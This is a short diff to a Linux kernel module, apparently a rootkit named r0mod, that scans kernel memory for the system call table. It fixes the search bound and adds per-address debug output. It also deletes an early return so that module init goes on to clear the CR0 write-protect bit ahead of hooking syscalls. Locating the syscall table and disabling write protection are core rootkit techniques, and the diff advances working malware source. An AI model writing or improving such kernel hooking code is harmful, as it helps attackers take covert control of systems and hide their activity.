@@ -10,7 +10,7 @@
 #include <r0mod/global.h>
 
 #define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      PAGE_SIZE
+#define SEARCH_END      PAGE_OFFSET + PAGE_SIZE
 
 unsigned long *syscall_table;
 
@@ -60,13 +60,15 @@ unsigned long *find_sys_call_table(void)
 
     for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
     {
-        unsigned long *sys_call_table = (unsigned long *)i;
+        unsigned long *sct = (unsigned long *)i;
 
-        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
+        if(sct[__NR_close] == (unsigned long)sys_close)
         {
-            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
-            return sys_call_table;
+            printk("sys_call_table found @ %lx\n", (unsigned long)sct);
+            return sct;
         }
+        else
+            printk("Addr: %lx\n", i);
     }
 
     return NULL;
@@ -91,8 +93,6 @@ static int __init r0mod_init(void)
     }
 
     printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
-
-    return -1;
 
     write_cr0(read_cr0() & (~0x10000));
 
